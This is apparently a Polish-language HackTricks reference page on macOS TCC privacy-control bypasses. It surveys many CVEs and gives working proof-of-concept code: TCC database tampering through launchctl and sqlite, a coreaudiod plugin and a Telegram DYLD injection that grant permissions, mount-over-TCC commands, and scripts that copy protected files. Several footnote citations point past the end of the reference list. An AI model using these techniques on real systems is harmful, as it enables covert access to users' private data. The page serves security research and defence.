# macOS TCC Bypasses

{{#include ../../../../../banners/hacktricks-training.md}}

## Według funkcjonalności

### Write Bypass

To nie jest bypass, tylko sposób działania TCC: **nie chroni przed zapisem**. Jeśli Terminal **nie ma dostępu do odczytu pulpitu użytkownika, nadal może zapisywać w tym miejscu**:
```shell-session
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```
Atrybut rozszerzony **`com.apple.macl`** jest dodawany do nowego **pliku**, aby zapewnić **aplikacji twórców** dostęp do jego odczytu.<sup>[[2]](#references)</sup>

### TCC ClickJacking

Możliwe jest **umieszczenie okna nad monitem TCC**, aby skłonić użytkownika do **zaakceptowania** go bez jego wiedzy. PoC znajdziesz w [**TCC-ClickJacking**](https://github.com/breakpointHQ/TCC-ClickJacking)**.**<sup>[[18]](#references)</sup>

<figure><img src="broken-reference" alt=""><figcaption><p><a href="https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg">https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg</a></p></figcaption></figure>

### TCC Request by arbitrary name

Atakujący może **tworzyć aplikacje o dowolnej nazwie** (np. Finder, Google Chrome...) w **`Info.plist`** i sprawić, aby żądały dostępu do lokalizacji chronionej przez TCC. Użytkownik będzie myślał, że to legalna aplikacja żąda tego dostępu.\
Ponadto możliwe jest **usunięcie legalnej aplikacji z Docka i umieszczenie w nim fałszywej**, więc gdy użytkownik kliknie fałszywą aplikację (która może używać tej samej ikony), może ona wywołać legalną aplikację, zażądać uprawnień TCC i wykonać malware, sprawiając, że użytkownik uwierzy, iż to legalna aplikacja zażądała dostępu.<sup>[[2]](#references)</sup>

<figure><img src="https://lh7-us.googleusercontent.com/Sh-Z9qekS_fgIqnhPVSvBRmGpCXCpyuVuTw0x5DLAIxc2MZsSlzBOP7QFeGo_fjMeCJJBNh82f7RnewW1aWo8r--JEx9Pp29S17zdDmiyGgps1hH9AGR8v240m5jJM8k0hovp7lm8ZOrbzv-RC8NwzbB8w=s2048" alt="" width="375"><figcaption></figcaption></figure>

Więcej informacji i PoC znajdziesz w:


{{#ref}}
../../../macos-privilege-escalation.md
{{#endref}}

### SSH Bypass

Domyślnie dostęp przez **SSH miał uprawnienie "Full Disk Access"**. Aby je wyłączyć, należy pozostawić SSH na liście, ale je wyłączyć (usunięcie go z listy nie odbierze tych uprawnień):<sup>[[2]](#references)</sup>

![TCC Request by arbitrary name - SSH Bypass: Domyślnie dostęp przez SSH miał uprawnienie "Full Disk Access". Aby je wyłączyć, należy pozostawić SSH na liście, ale je wyłączyć (usunięcie go...](<../../../../../images/image (1077).png>)

Tutaj znajdziesz przykłady tego, jak niektóre **malware potrafiły ominąć tę ochronę**:

- [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/) <sup>[[9]](#references)</sup>

> [!CAUTION]
> Pamiętaj, że obecnie, aby móc włączyć SSH, potrzebujesz **Full Disk Access**

### Handle extensions - CVE-2022-26767

Atrybut **`com.apple.macl`** jest nadawany plikom, aby zapewnić **określonej aplikacji uprawnienia do ich odczytu.** Atrybut ten jest ustawiany podczas **przeciągania i upuszczania** pliku na aplikację lub gdy użytkownik **klika dwukrotnie** plik, aby otworzyć go za pomocą **aplikacji domyślnej**.

W związku z tym użytkownik mógłby **zarejestrować złośliwą aplikację**, która obsługiwałaby wszystkie rozszerzenia, i wywołać Launch Services, aby **otworzyć** dowolny plik (dzięki czemu złośliwy plik otrzyma uprawnienia do jego odczytu).<sup>[[23]](#references)</sup>

### iCloud

Dzięki entitlementowi **`com.apple.private.icloud-account-access`** można komunikować się z usługą XPC **`com.apple.iCloudHelper`**, która **udostępnia tokeny iCloud**.

**iMovie** i **Garageband** miały ten entitlement oraz inne, które na to pozwalały.

Więcej **informacji** o exploicie umożliwiającym **pozyskanie tokenów iCloud** dzięki temu entitlementowi znajdziesz w prezentacji: [**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)<sup>[[10]](#references)</sup>

### kTCCServiceAppleEvents / Automation

Aplikacja posiadająca uprawnienie **`kTCCServiceAppleEvents`** będzie mogła **kontrolować inne aplikacje**. Oznacza to, że może być w stanie **nadużywać uprawnień przyznanych innym aplikacjom**.<sup>[[2]](#references)</sup>

Więcej informacji o Apple Scripts znajdziesz tutaj:


{{#ref}}
macos-apple-scripts.md
{{#endref}}

Na przykład jeśli aplikacja ma **uprawnienie Automation dla `iTerm`**, jak w tym przykładzie, **`Terminal`** ma dostęp do iTerm:

<figure><img src="../../../../../images/image (981).png" alt=""><figcaption></figcaption></figure>

#### Over iTerm

Terminal, który nie ma FDA, może wywołać iTerm, który je posiada, i użyć go do wykonania działań:
```applescript:iterm.script
tell application "iTerm"
activate
tell current window
create tab with default profile
end tell
tell current session of current window
write text "cp ~/Desktop/private.txt /tmp"
end tell
end tell
```

```bash
osascript iterm.script
```
#### Przez Finder

Jeśli aplikacja ma dostęp przez Finder, może uruchomić skrypt taki jak ten:
```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```
## Według zachowania aplikacji

### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

Demon **tccd** działający w **userland** używał zmiennej **`HOME`** **env** do uzyskiwania dostępu do bazy danych użytkowników TCC pod adresem: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**

Zgodnie z [tym wpisem na Stack Exchange](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686), a także dlatego, że demon TCC jest uruchamiany za pośrednictwem **`launchd`** w domenie bieżącego użytkownika, możliwe jest **kontrolowanie wszystkich zmiennych środowiskowych** przekazywanych do niego.<sup>[[19]](#references)</sup>\
W ten sposób **atakujący mógł ustawić zmienną środowiskową `$HOME`** w **`launchctl`**, aby wskazywała na **kontrolowany** **katalog**, ponownie uruchomić demona **TCC**, a następnie **bezpośrednio zmodyfikować bazę danych TCC**, przyznając sobie **każde dostępne uprawnienie TCC**, bez wyświetlania użytkownikowi końcowemu jakiegokolwiek monitu.<sup>[[1]](#references)</sup>\
PoC:
```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump
$> sqlite3 TCC.db "INSERT INTO access
VALUES('kTCCServiceSystemPolicyDocumentsFolder',
'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
NULL,
NULL,
'UNUSED',
NULL,
NULL,
1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```
### CVE-2021-30761 - Notes

Notes miała dostęp do lokalizacji chronionych przez TCC, ale nowo utworzona notatka była **zapisywana w lokalizacji niechronionej**. Dlatego atakujący mógł poprosić Notes o skopiowanie chronionego pliku do notatki, a następnie uzyskać dostęp do wynikowych danych z niechronionej lokalizacji:

<figure><img src="../../../../../images/image (476).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-30782 - Translocation

Binary `/usr/libexec/lsd` wraz z biblioteką `libsecurity_translocate` miał entitlement `com.apple.private.nullfs_allow`, który pozwalał mu tworzyć mount **nullfs**, oraz entitlement `com.apple.private.tcc.allow` z **`kTCCServiceSystemPolicyAllFiles`**, umożliwiający dostęp do każdego pliku.

Możliwe było dodanie atrybutu kwarantanny do "Library", wywołanie usługi XPC **`com.apple.security.translocation`**, a następnie usługa mapowała Library do **`$TMPDIR/AppTranslocation/d/d/Library`**, gdzie wszystkie dokumenty znajdujące się w Library mogły być **odczytywane**.

### CVE-2024-44131 - FileProvider symlink race

Aplikacje, które przekazują operacje na plikach **uprzywilejowanemu helperowi** (tutaj **`fileproviderd`** / **`Files.app`**), kopiują lub przenoszą elementy **w imieniu użytkownika**, więc kopiowanie jest wykonywane z uprawnieniami helpera, a nie wywołującego go procesu.

Jamf Threat Labs pokazało, że walidację symlink wykonywaną przed operacją można **wyścignąć**: zamiast umieszczać symlink w **ostatnim** komponencie ścieżki (który jest sprawdzany), atakujący podmienia **pośredni** katalog ścieżki **po rozpoczęciu kopiowania**. Uprzywilejowany helper podąża wtedy za kontrolowanym przez atakującego linkiem i odczytuje/zapisuje lokalizacje chronione przez TCC **bez wyświetlania monitu**.<sup>[[5]](#references)</sup>

Katalogi, które **nie są chronione** losowym UUID w swojej ścieżce (na przykład `~/Library/Mobile Documents/com~apple~CloudDocs`), są najłatwiejszymi celami, ponieważ atakujący może przewidzieć pełną ścieżkę potrzebną do przeprowadzenia race.

> [!TIP]
> To ogólny wzorzec, którego należy szukać: **każdy uprzywilejowany proces, który rozwiązuje ścieżkę więcej niż raz** (check-then-use albo `rename()`/`copyfile()` rozwiązujące osobno źródło i miejsce docelowe) może zostać wyścignięty przez podmianę katalogu w środku ścieżki. Tylko `O_NOFOLLOW_ANY`, `openat()` na już otwartym deskryptorze pliku katalogu albo `realpath()` + ponowna walidacja faktycznie zamykają tę lukę czasową.

Więcej informacji znajduje się w [**writeupie Jamf Threat Labs**](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/).<sup>[[5]](#references)</sup>

### SQLITE_SQLLOG_DIR

`libsqlite3` może zostać zbudowana z `SQLITE_ENABLE_SQLLOG`, co dodaje hook logowania sterowany przez zmienne środowiskowe ([upstream `test_sqllog.c`](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)):<sup>[[6]](#references)</sup>

- **`SQLITE_SQLLOG_DIR=path`** – dla **każdej otwieranej bazy danych** **kopia pliku bazy danych** oraz log instrukcji SQL są zapisywane w `path` (katalog musi już istnieć).
- **`SQLITE_SQLLOG_REUSE_FILES=0`** – twórz **świeżą kopię za każdym razem**, gdy baza danych jest otwierana/podłączana, zamiast ponownie używać istniejącej.
- **`SQLITE_SQLLOG_CONDITIONAL`** – loguj połączenie tylko wtedy, gdy obok głównej bazy danych istnieje plik `<database>-sqllog`.

Jeśli uda się wstrzyknąć tę zmienną do procesu, który ma **FDA** i otwiera bazy SQLite, proces bez problemu **skopiuje te chronione bazy danych** do kontrolowanego przez Ciebie katalogu. Ponieważ nazwa pliku docelowego jest wyprowadzana z danych kontrolowanych przez atakującego, **symlink umieszczony w miejscu docelowym** zmienia ten sam prymityw w **zapis do dowolnego pliku** z uprawnieniami procesu docelowego.

### **SQLITE_AUTO_TRACE**

Jeśli zmienna środowiskowa **`SQLITE_AUTO_TRACE`** jest ustawiona, biblioteka **`libsqlite3.dylib`** rozpocznie **logowanie** wszystkich zapytań SQL. Wiele aplikacji korzystało z tej biblioteki, dlatego możliwe było logowanie wszystkich ich zapytań SQLite.<sup>[[22]](#references)</sup>

Kilka aplikacji Apple używało tej biblioteki do uzyskiwania dostępu do informacji chronionych przez TCC.
```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```
### Hunting for env-var driven file writes

Dwa poprzednie wpisy są przykładami tej samej generic technique i warto szukać kolejnych przypadków: **frameworks załadowane do aplikacji uprzywilejowanych w TCC często udostępniają debug/logging environment variables, które powodują, że proces tworzy plik pod ścieżką kontrolowaną przez wywołującego**.

Workflow wyszukiwania:

1. Wybierz target z FDA lub innym cennym uprawnieniem TCC (`Music`, `TV`, `Terminal`, agenty MDM...) i wyświetl frameworks, z którymi jest linkowany (`otool -L`, `vmmap`).
2. Wykonaj grep tych frameworks pod kątem strings `getenv`: `strings -a /System/Library/Frameworks/<X>.framework/<X> | grep -iE '^[A-Z0-9_]{6,}$'`.
3. Ustaw candidate variables przez `launchctl setenv NAME /path/you/control`, uruchom aplikację i obserwuj jej działania w systemie plików za pomocą `fs_usage -w -f filesys <pid>` lub `sudo fs_usage | grep <path>`.
4. Jeśli proces **tworzy lub zmienia nazwę** pliku w Twoim katalogu, masz write primitive: wskaż jako destination symlink (albo wykonaj race na pośrednim katalogu, jak w CVE-2024-44131 powyżej), aby przekierować zapis do `~/Library/Application Support/com.apple.TCC/TCC.db`.

> [!TIP]
> Ograniczają to dwie kwestie. Po pierwsze, zmienne **`DYLD_*`** są ignorowane przez binaries z hardened runtime, chyba że aplikacja zawiera entitlement [`com.apple.security.cs.allow-dyld-environment-variables`](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables) ("a Boolean value that indicates whether the app may be affected by dynamic linker environment variables, which you can use to inject code into your app's process") — zobacz także [Notarization: the hardened runtime](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/). Po drugie, Apple usuwa poszczególne framework debug variables, gdy zostaną zgłoszone, więc zmienna, która działała w jednej wersji macOS, często znika w następnej. Jeśli aplikacja po jej ustawieniu po cichu odmawia uruchomienia, uznaj tę zmienną za już filtrowaną.<sup>[[7]](#references)[[8]](#references)</sup>

Zobacz [macOS Dyld Hijacking & DYLD_INSERT_LIBRARIES](../../../macos-proces-abuse/macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md), aby poznać equivalent trick z użyciem linker variables.

### Apple Remote Desktop

Jako root można było włączyć tę usługę, a **ARD agent będzie miał full disk access**, który następnie mógł zostać wykorzystany przez użytkownika do skopiowania nowej **TCC user database**.

## By **NFSHomeDirectory**

TCC używa database w katalogu HOME użytkownika do kontrolowania dostępu do zasobów specyficznych dla użytkownika w **$HOME/Library/Application Support/com.apple.TCC/TCC.db**.\
Dlatego jeśli użytkownik zdoła zrestartować TCC ze zmienną środowiskową $HOME wskazującą na **inny folder**, może utworzyć nową TCC database w **/Library/Application Support/com.apple.TCC/TCC.db** i nakłonić TCC do przyznania dowolnego uprawnienia TCC dowolnej aplikacji.

> [!TIP]
> Należy pamiętać, że Apple używa ustawienia przechowywanego w profilu użytkownika, w atrybucie **`NFSHomeDirectory`**, jako **wartości `$HOME`**, więc jeśli przejmiesz aplikację mającą uprawnienia do modyfikowania tej wartości (**`kTCCServiceSystemPolicySysAdminFiles`**), możesz **uzbroić** tę opcję w celu wykonania TCC bypass.

### [CVE-2020–9934 - TCC](#c19b) <a href="#c19b" id="c19b"></a>

### [CVE-2020-27937 - Directory Utility](#cve-2020-27937-directory-utility-1)

### CVE-2021-30970 - Powerdir

**Pierwszy POC** używa [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) i [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) do modyfikowania folderu **HOME** użytkownika.

1. Uzyskaj blob _csreq_ dla target app.
2. Umieść fake _TCC.db_ file z wymaganym dostępem i blobem _csreq_.
3. Wyeksportuj wpis użytkownika z Directory Services za pomocą [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/).
4. Zmodyfikuj wpis Directory Services, aby zmienić home directory użytkownika.
5. Zaimportuj zmodyfikowany wpis Directory Services za pomocą [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/).
6. Zatrzymaj _tccd_ użytkownika i zrestartuj proces.

Drugi POC używał **`/usr/libexec/configd`**, który miał `com.apple.private.tcc.allow` z wartością `kTCCServiceSystemPolicySysAdminFiles`.\
Możliwe było uruchomienie **`configd`** z opcją **`-t`**, która pozwalała attackerowi wskazać **custom Bundle do załadowania**. Dlatego exploit **zastępuje** metodę zmiany home directory użytkownika za pomocą **`dsexport`** i **`dsimport`** przez **`configd` code injection**.

Więcej informacji znajdziesz w [**original report**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/).<sup>[[11]](#references)</sup>

## By process injection

Istnieją różne techniques umożliwiające wstrzyknięcie code do procesu i wykorzystanie jego uprawnień TCC:


{{#ref}}
../../../macos-proces-abuse/
{{#endref}}

Ponadto najczęściej spotykany process injection używany do TCC bypass odbywa się za pośrednictwem **plugins (load library)**.\
Plugins to dodatkowy code, zwykle w formie libraries lub plist, który jest **ładowany przez main application** i wykonywany w jej context. Dlatego jeśli main application miała dostęp do plików ograniczonych przez TCC (za pośrednictwem przyznanych permissions lub entitlements), **custom code również będzie go mieć**.

### CVE-2020-27937 - Directory Utility

Aplikacja `/System/Library/CoreServices/Applications/Directory Utility.app` miała entitlement **`kTCCServiceSystemPolicySysAdminFiles`**, ładowała plugins z rozszerzeniem **`.daplug`** i **nie miała hardened** runtime.

Aby uzbroić tę CVE, **`NFSHomeDirectory`** jest **zmieniany** (przez wykorzystanie poprzedniego entitlement), aby móc **przejąć TCC database użytkownika** i wykonać TCC bypass.

Więcej informacji znajdziesz w [**original report**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/).<sup>[[12]](#references)</sup>

### CVE-2020-29621 - Coreaudiod

Binary **`/usr/sbin/coreaudiod`** miał entitlements `com.apple.security.cs.disable-library-validation` oraz `com.apple.private.tcc.manager`. Pierwszy **umożliwiał code injection**, a drugi zapewniał mu dostęp do **zarządzania TCC**.

Ten binary pozwalał ładować **third party plug-ins** z folderu `/Library/Audio/Plug-Ins/HAL`. Dlatego możliwe było **załadowanie pluginu i wykorzystanie uprawnień TCC** za pomocą tego POC:<sup>[[13]](#references)</sup>
```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");

CFStringRef bundleID = CFSTR("com.apple.Terminal");
CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
SecRequirementRef requirement = NULL;
SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
CFDataRef requirementData = NULL;
SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);

TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {

add_tcc_entry();

NSLog(@"[+] Exploitation finished...");
exit(0);
```
Więcej informacji znajdziesz w [**oryginalnym raporcie**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/).<sup>[[13]](#references)</sup>

### Device Abstraction Layer (DAL) Plug-Ins

Aplikacje systemowe, które otwierają strumień z kamery za pośrednictwem Core Media I/O (aplikacje z **`kTCCServiceCamera`**), ładują w procesie te pluginy znajdujące się w `/Library/CoreMediaIO/Plug-Ins/DAL` (nieobjętym ograniczeniami SIP).

Samo umieszczenie tam biblioteki ze standardowym **constructorem** wystarczy, aby **wstrzyknąć kod**.

Kilka aplikacji Apple było na to podatnych.

### Firefox

Aplikacja Firefox posiadała entitlements `com.apple.security.cs.disable-library-validation` oraz `com.apple.security.cs.allow-dyld-environment-variables`:<sup>[[14]](#references)</sup>
```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.cs.allow-unsigned-executable-memory</key>
<true/>
<key>com.apple.security.cs.disable-library-validation</key>
<true/>
<key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
<true/>
<key>com.apple.security.device.audio-input</key>
<true/>
<key>com.apple.security.device.camera</key>
<true/>
<key>com.apple.security.personal-information.location</key>
<true/>
<key>com.apple.security.smartcard</key>
<true/>
</dict>
</plist>
```
Więcej informacji o tym, jak łatwo to exploitować, znajdziesz w [**oryginalnym raporcie**](https://wojciechregula.blog/post/how-to-rob-a-firefox/).<sup>[[14]](#references)</sup>

### CVE-2020-10006

Binary `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` miał uprawnienia **`com.apple.private.tcc.allow`** oraz **`com.apple.security.get-task-allow`**, które umożliwiały wstrzyknięcie code do procesu i wykorzystanie uprawnień TCC.

### CVE-2023-26818 - Telegram

Telegram miał uprawnienia **`com.apple.security.cs.allow-dyld-environment-variables`** oraz **`com.apple.security.cs.disable-library-validation`**, więc można było je wykorzystać, aby **uzyskać dostęp do jego uprawnień**, na przykład do nagrywania za pomocą kamery. [**Payload znajdziesz w writeupie**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/).<sup>[[15]](#references)</sup>

Zwróć uwagę, że aby użyć zmiennej środowiskowej do załadowania biblioteki, utworzono **custom plist** w celu wstrzyknięcia tej biblioteki, a następnie użyto **`launchctl`** do jej uruchomienia:<sup>[[15]](#references)</sup>
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.telegram.launcher</string>
<key>RunAtLoad</key>
<true/>
<key>EnvironmentVariables</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/tmp/telegram.dylib</string>
</dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
</array>
<key>StandardOutPath</key>
<string>/tmp/telegram.log</string>
<key>StandardErrorPath</key>
<string>/tmp/telegram.log</string>
</dict>
</plist>
```

```bash
launchctl load com.telegram.launcher.plist
```
## Przez wywołania open

Możliwe jest wywołanie **`open`** nawet w sandboxie

### Skrypty terminala

Dość często nadaje się terminalowi **Full Disk Access (FDA)**, przynajmniej na komputerach używanych przez osoby zajmujące się technologią. Możliwe jest również wywoływanie za jego pomocą skryptów **`.terminal`**.

Skrypty **`.terminal`** to pliki plist, takie jak ten, zawierające polecenie do wykonania w kluczu **`CommandString`**:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>CommandString</key>
<string>cp ~/Desktop/private.txt /tmp/;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
```
Aplikacja mogłaby zapisać skrypt terminala w lokalizacji takiej jak `/tmp` i uruchomić go za pomocą polecenia takiego jak:
```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```
## Przez montowanie

### CVE-2020-9771 - mount_apfs TCC bypass i privilege escalation

**Każdy użytkownik** (nawet nieuprzywilejowany) może utworzyć i zamontować snapshot Time Machine oraz uzyskać **dostęp do WSZYSTKICH plików** tego snapshotu.\
**Jedynym wymaganym uprawnieniem** jest to, aby używana aplikacja (np. `Terminal`) miała **Full Disk Access** (FDA) (`kTCCServiceSystemPolicyAllfiles`), które musi zostać przyznane przez administratora.<sup>[[2]](#references)</sup>
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
Bardziej szczegółowe wyjaśnienie można [**znaleźć w oryginalnym raporcie**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**<sup>[[20]](#references)</sup>

### CVE-2021-1784 & CVE-2021-30808 - Mount over TCC file

Nawet jeśli plik TCC DB jest chroniony, możliwe było **zamontowanie nad katalogiem** nowego pliku TCC.db:
```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```

```python
# This was the python function to create the dmg
def create_dmg():
os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
os.system("mkdir /tmp/mnt")
os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```
Sprawdź **pełny exploit** w [**oryginalnym opisie**](https://theevilbit.github.io/posts/cve-2021-30808/).<sup>[[21]](#references)</sup>

### CVE-2024-40855

Jak wyjaśniono w [oryginalnym opisie](https://www.kandji.io/blog/macos-audit-story-part2), to CVE wykorzystywało `diskarbitrationd`.<sup>[[16]](#references)</sup>

Funkcja `DADiskMountWithArgumentsCommon` z public frameworka `DiskArbitration` wykonywała kontrole bezpieczeństwa. Można je jednak ominąć, wywołując bezpośrednio `diskarbitrationd`, a następnie używać elementów `../` w ścieżce i symlinków.

Umożliwiało to atakującemu wykonywanie dowolnych mountów w dowolnej lokalizacji, w tym na bazie danych TCC, dzięki entitlementowi `com.apple.private.security.storage-exempt.heritable` procesu `diskarbitrationd`.

### asr

Narzędzie **`/usr/sbin/asr`** umożliwiało skopiowanie całego dysku i zamontowanie go w innym miejscu, z pominięciem ochrony TCC.

### CVE-2022-22655 - Usługi lokalizacji

Usługi lokalizacji **nie są** przechowywane w bazie danych TCC, tak jak inne usługi. Są zarządzane przez `locationd`, który przechowuje własną listę dozwolonych w **`/var/db/locationd/clients.plist`**:<sup>[[4]](#references)</sup>
```bash
# Requires FDA to read
sudo plutil -p /var/db/locationd/clients.plist | head -40
```
Każdy wpis jest identyfikowany przez klienta (bundle ID lub ścieżkę do executable) i zawiera pola takie jak `Authorized`, `BundleId`, `Executable` oraz `Registered`.<sup>[[4]](#references)</sup>

Sam plik `clients.plist` jest chroniony przez Sandbox/TCC i nie można go edytować nawet z uprawnieniami root — jednak **katalog `/var/db/locationd/` nie był chroniony przed montowaniem**. Dlatego attacker działający jako root mógł utworzyć obraz dysku zawierający własny plik `clients.plist` (z oznaczeniem swojego binary jako `Authorized`), zamontować go w miejsce tego katalogu i zrestartować `locationd`, aby wymuszona allow-list zaczęła obowiązywać.<sup>[[3]](#references)</sup>

> [!TIP]
> To ten sam schemat co w opisanych powyżej TCC bypassach z użyciem `hdiutil`/`mount`: *plik* jest chroniony, ale *katalog, w którym się znajduje*, już nie, więc zamiast pliku podmieniasz cały katalog.

## Przez aplikacje uruchamiane przy starcie


{{#ref}}
../../../../macos-auto-start-locations.md
{{#endref}}

## Przez grep

W wielu przypadkach pliki przechowują sensitive information, takie jak adresy email, numery telefonów, wiadomości... w niechronionych lokalizacjach (co według Apple jest uznawane za vulnerability).

<figure><img src="../../../../../images/image (474).png" alt=""><figcaption></figcaption></figure>

## Synthetic Clicks

To już nie działa, ale [**w przeszłości działało**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**:**

<figure><img src="../../../../../images/image (29).png" alt=""><figcaption></figcaption></figure>

Inny sposób wykorzystujący [**zdarzenia CoreGraphics**](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf):<sup>[[17]](#references)</sup>

<figure><img src="../../../../../images/image (30).png" alt="" width="563"><figcaption></figcaption></figure>

## References

- [1] [CVE-2020–9934: Omijanie frameworka macOS Transparency, Consent, and Control (TCC)](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
- [2] [Przypadkowe i celowe omijanie ochrony prywatności użytkownika macOS TCC](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
- [3] [CVE-2022-22655 - obejście TCC Location Services (oryginalny raport)](https://theevilbit.github.io/posts/cve-2022-22655/)
- [4] [Gdzie na świecie jest Carmen Sandiego: nadużywanie Location Services w macOS](https://slyd0g.medium.com/where-in-the-world-is-carmen-sandiego-abusing-location-services-on-macos-10e9f4eefb71)
- [5] [Jamf Threat Labs - CVE-2024-44131: TCC bypass kradnie dane z iCloud](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/)
- [6] [SQLite - `test_sqllog.c` (zmienne środowiskowe SQLITE_ENABLE_SQLLOG)](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)
- [7] [Apple - entitlement zezwalający na zmienne środowiskowe DYLD](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables)
- [8] [The Eclectic Light Company - Notaryzacja: hardened runtime](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/)
